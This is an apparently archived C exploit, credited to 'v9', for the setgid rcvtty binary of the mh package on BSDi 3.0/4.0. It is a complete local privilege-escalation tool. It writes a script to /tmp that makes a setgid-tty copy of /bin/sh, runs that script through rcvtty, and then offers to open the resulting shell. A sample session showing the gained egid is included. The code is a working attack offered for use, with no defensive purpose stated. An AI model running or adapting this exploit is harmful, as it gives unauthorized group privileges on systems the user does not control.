/*
   (BSDi3.0/4.0)rcvtty[mh] local exploit, by v9[v9@fakehalo.org].  this exploit
   is for the rcvtty of the mh package, which is setgid=4(tty) on BSDi.  this
   exploit gives you egid/group=4(tty) access.

   example:
   -------------------------------------------------
   bash-2.02$ id
   uid=101(v9) gid=100(user) groups=100(user)
   bash-2.02$ cc xrcvtty.c -o xrcvtty
   bash-2.02$ ./xrcvtty
   [ (BSDi3.0/4.0)rcvtty[mh] local exploit, by v9[v9@fakehalo.org]. ]
   
   [*] /usr/contrib/mh/lib/rcvtty appears to be setgid.
   [*] now making shell script to execute.
   [*] done, now building and executing the command line.
   [*] done, now checking for success.
   [*] success, /tmp/ttysh is now setgid.
   [*] finished, everything appeared to have gone successful.
   [?] do you wish to enter the sgidshell now(y/n)?: y
   [*] ok, executing shell(/tmp/ttysh) now.
   $ id
   uid=101(v9) gid=100(user) egid=4(tty) groups=4(tty), 100(user)
   $ 
   -------------------------------------------------

   info: findings and exploit by v9[v9@fakehalo.org].
*/

#define PATH		"/usr/contrib/mh/lib/rcvtty"	/* path to rcvtty. */
#define MAKESHELL 	"/tmp/mksh.sh"			/* tmpfile to exec. */
#define SGIDSHELL	"/tmp/ttysh"			/* gidshell location. */
#include <stdio.h>
#include <sys/stat.h>

main()
{
  char cmd[256],in[1];
  struct stat mod1,mod2;
  FILE *sgidexec;
  fprintf(stderr,"[ (BSDi3.0/4.0)rcvtty[mh] local exploit, by v9[v9@fakehalo.org]. ]\n\n",PATH);
  if(stat(PATH,&mod1)){
    fprintf(stderr,"[!] failed, %s doesnt appear to exist.\n",PATH);
    exit(1);
  } else if(mod1.st_mode==34285){
    fprintf(stderr,"[*] %s appears to be setgid.\n",PATH);
  } else {
    fprintf(stderr,"[!] failed, %s doesn't appear to be setgid.\n",PATH);
    exit(1);
  }
  fprintf(stderr,"[*] now making shell script to execute.\n");
  unlink(MAKESHELL);
  sgidexec=fopen(MAKESHELL,"w");
  fprintf(sgidexec,"#!/bin/sh\n");
  fprintf(sgidexec,"cp /bin/sh %s\n",SGIDSHELL);
  fprintf(sgidexec,"chgrp tty %s\n",SGIDSHELL);
  fprintf(sgidexec,"chmod 2755 %s\n",SGIDSHELL);
  fclose(sgidexec);
  chmod(MAKESHELL,33261);
  fprintf(stderr,"[*] done, now building and executing the command line.\n");
  snprintf(cmd,sizeof(cmd),"echo yes | %s %s 1>/dev/null 2>&1",PATH,MAKESHELL);
  system(cmd);
  unlink(MAKESHELL);
  fprintf(stderr,"[*] done, now checking for success.\n");
  if(stat(SGIDSHELL,&mod2)){
    fprintf(stderr,"[!] failed, %s doesn't exist.\n",SGIDSHELL);
    exit(1);
  } else if(mod2.st_mode==34285){
    fprintf(stderr,"[*] success, %s is now setgid.\n",SGIDSHELL);
  } else {
    fprintf(stderr,"[!] failed, %s doesn't appear to be setgid.\n",SGIDSHELL);
    exit(1);
  }
  fprintf(stderr,"[*] finished, everything appeared to have gone successful.\n");
  fprintf(stderr,"[?] do you wish to enter the sgidshell now(y/n)?: ");
  scanf("%s",in);
  if(strcmp(in,"y")){
    printf("[*] ok, aborting execution, the shell is: %s.\n",SGIDSHELL);
  } else{
    printf("[*] ok, executing shell(%s) now.\n",SGIDSHELL);
    execl(SGIDSHELL,SGIDSHELL,0);
  }
  exit(0);
}


// milw0rm.com [2000-11-21]
